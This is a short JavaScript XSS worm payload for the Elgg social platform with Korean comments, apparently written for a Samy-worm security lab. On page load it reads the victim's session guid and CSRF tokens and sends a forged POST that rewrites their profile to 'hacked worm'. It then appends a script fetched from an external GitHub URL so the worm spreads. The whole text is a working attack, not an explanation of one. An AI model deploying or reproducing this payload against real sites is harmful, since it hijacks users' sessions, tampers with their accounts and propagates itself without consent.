<script type="text/javascript">
window.onload=function(){
    // 기존 코드: 피해자의 프로필을 수정하는 코드
    var userName="&name="+elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    var desc = encodeURIComponent("hacked worm"); // 피해자의 프로필에 입력될 내용
    var content= "description=" + desc + userName + guid + ts + token; // 리퀘스트를 구성하는 매개변수 입력
    var sendurl = "/action/profile/edit"; // 프로필 수정을 위한 URL
    var samygid= 49; // Samy의 guid (피해자의 프로필을 수정하지 않는 것이 목표)
    if (elgg.session.user.guid!=samygid){
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }

    // 추가 코드: 웜을 피해자의 프로필에 복사하여 전파시키는 코드
    var wormScript = document.createElement('script');
    wormScript.src = 'https://raw.githubusercontent.com/namminju/worm_/main/xss_worm.js'; // 외부 스크립트의 URL
    document.body.appendChild(wormScript); // 웜을 피해자의 프로필에 추가하여 전파시킴
}
</script>
